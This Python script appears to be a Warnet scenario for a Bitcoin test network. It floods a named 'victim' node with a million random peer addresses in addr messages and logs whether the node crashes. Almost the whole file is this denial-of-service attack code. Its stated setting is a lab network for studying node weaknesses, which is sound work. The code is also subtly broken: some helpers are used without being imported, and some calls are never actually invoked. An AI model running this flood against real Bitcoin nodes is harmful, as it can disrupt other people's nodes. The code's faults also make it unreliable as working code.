#!/usr/bin/env python3

import socket

from commander import Commander

import random
import time

from test_framework.messages import (
    CAddress,
    msg_addr,
    msg_getaddr,
    msg_verack,
)
from test_framework.p2p import (
    P2PInterface,
    p2p_lock,
    P2P_SERVICES,
)
from test_framework.test_framework import BitcoinTestFramework
from test_framework.util import (
    assert_equal,
    assert_greater_than,
    assert_greater_than_or_equal,
)


def get_signet_network_magic_from_node(node):
    template = node.getblocktemplate({"rules": ["segwit", "signet"]})
    challenge = template["signet_challenge"]
    challenge_bytes = bytes.fromhex(challenge)
    data = len(challenge_bytes).to_bytes() + challenge_bytes
    digest = hash256(data)
    return digest[0:4]


class AddrSpam(Commander):
    def set_test_params(self):
        self.num_nodes = 1

    def add_options(self, parser):
        parser.description = "Spam Addr message to a node"
        parser.usage = "warnet run stub_addr_spam --debug"

    def setup_addr_msg(self, num):
        addrs = []
        for i in range(num):
            addr = CAddress()
            addr.time = self.mocktime + random.randrange(-100, 100)
            addr.nServices = P2P_SERVICES
            addr.ip = f"{random.randrange(128,169)}.{random.randrange(1,255)}.{random.randrange(1,255)}.{random.randrange(1,255)}"

            addr.port = 8333 + i
            addrs.append(addr)

        msg = msg_addr()
        msg.addrs = addrs
        return msg

    def run_test(self):
        """Test addr spam vulnerability"""

        victim = "tank-0017-blue.default.svc"

        self.log.info(f"Testing addr spam vulnerability on tank: {victim}")

        # regtest or signet
        chain = self.nodes[0].chain

        # The victim's address could be an explicit IP address
        # OR a kubernetes hostname (use default chain p2p port)
        dstaddr = socket.gethostbyname(victim)
        if chain == "regtest":
            dstport = 18444
        if chain == "signet":
            dstport = 38333
            MAGIC_BYTES["signet"] = get_signet_network_magic_from_node(self.nodes[0])

        # connect to node
        peer = P2PInterface()
        peer.peer_connect(
            dstaddr=dstaddr, dstport=dstport, net="signet", timeout_factor=1
        )()
        peer.wait_until(lambda: peer.is_connected, check_connected=False)

        # initial handshake
        peer.send_message(msg_verack)

        try:

            BATCH_SIZE = 1000  # size of addrs in a message
            NUM_BATCHES = 1000  # no of batches

            self.log.info(f"Sending {NUM_BATCHES} batches of {BATCH_SIZE} address...")

            for i in range(NUM_BATCHES):
                if i % 100 == 0:
                    self.log.info(f"Sent {i} batches...")

                # Create and send addr message with batches of addresses
                msg = self.setup_addr_msg(BATCH_SIZE)
                peer.send_and_ping(msg)

                # small delay b/w batches to avoid overwhelming the node
                time.sleep(0.1)

                # try to sync with node periodically
                if i % 10 == 0:
                    peer.sync_with_ping

            self.log.info("Finished addr spamming")
            peer.sync_with_ping

            # if we reached here then vulnerability is not enough or wrong peer
            self.log.info("Node did not crash, wrong node selection")

        except Exception as e:
            self.log.info(f"Node crashed with error: {str(e)}")
            raise

        finally:
            # cleanup
            self.nodes[0].disconnect_p2ps


def main():
    AddrSpam().main()


if __name__ == "__main__":
    main()
